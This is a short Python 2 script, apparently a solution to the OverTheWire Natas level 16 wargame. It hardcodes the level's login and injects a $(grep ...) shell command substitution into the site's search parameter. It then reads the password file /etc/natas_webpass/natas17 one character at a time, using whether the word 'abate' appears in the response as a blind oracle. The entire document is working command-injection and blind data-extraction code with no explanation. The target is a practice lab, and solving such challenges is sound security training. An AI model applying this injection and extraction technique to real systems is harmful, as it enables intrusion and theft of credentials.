import requests
import base64

chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
exists_char = ''
passwd = ''
auth = 'Basic ' + base64.b64encode('natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

for c in chars:
	r = requests.get("http://natas16.natas.labs.overthewire.org/?needle=abate$(grep+"+ c +"+/etc/natas_webpass/natas17)&submit=Search", headers = {"Authorization":auth})
	if "abate" not in r.text:
		exists_char += c
		print "Exists: " + exists_char
	
for i in range(0,32):
	for k in exists_char:
		r = requests.get("http://natas16.natas.labs.overthewire.org/?needle=abate$(grep+^"+ passwd + k +"+/etc/natas_webpass/natas17)&submit=Search", headers = {"Authorization":auth})
		if "abate" not in r.text:
			passwd += k
			print "Password: " + passwd
			break
